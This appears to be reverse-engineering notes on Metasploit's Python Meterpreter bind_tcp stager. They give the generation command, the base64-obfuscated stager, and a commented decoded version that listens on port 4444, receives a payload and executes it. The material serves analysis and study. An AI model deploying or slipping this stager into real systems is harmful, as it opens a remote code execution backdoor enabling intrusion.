# Metasploit RE

## Stager

See: 
 * https://blog.cobaltstrike.com/2012/09/13/a-loader-for-metasploits-meterpreter/

### python stager sample

Generate with:
```
msf5> use payload/python/meterpreter/bind_tcp
msf5 payload(python/meterpreter/bind_tcp) > generate -f raw -o /tmp/python_stager.py
```

Result:
```python
import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('aW1wb3J0IHNvY2tldCxzdHJ1Y3QKYj1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQpiLmJpbmQoKCcwLjAuMC4wJyw0NDQ0KSkKYi5saXN0ZW4oMSkKcyxhPWIuYWNjZXB0KCkKbD1zdHJ1Y3QudW5wYWNrKCc+SScscy5yZWN2KDQpKVswXQpkPXMucmVjdihsKQp3aGlsZSBsZW4oZCk8bDoKCWQrPXMucmVjdihsLWxlbihkKSkKZXhlYyhkLHsncyc6c30pCg==')))
```
Note: the dict is used to apply py2/3 compatibility with regards to decoding strings

Base64 decoded content:
```python
import socket,struct
b=socket.socket(2,socket.SOCK_STREAM)   # 2 = socket.AF_INET
b.bind(('0.0.0.0',4444))
b.listen(1)                             # 1 = backlog, maximum number of queued connections
s,a=b.accept()
l=struct.unpack('>I',s.recv(4))[0]      # Read the length of the payload into a 4 byte unsigned integer in native byte order
d=s.recv(l)                             # receive data, bufsize=l
while len(d)<l:
	d+=s.recv(l-len(d))
exec(d,{'s':s})                         # provide the socket file descriptor as global var 's' to payload in d
```
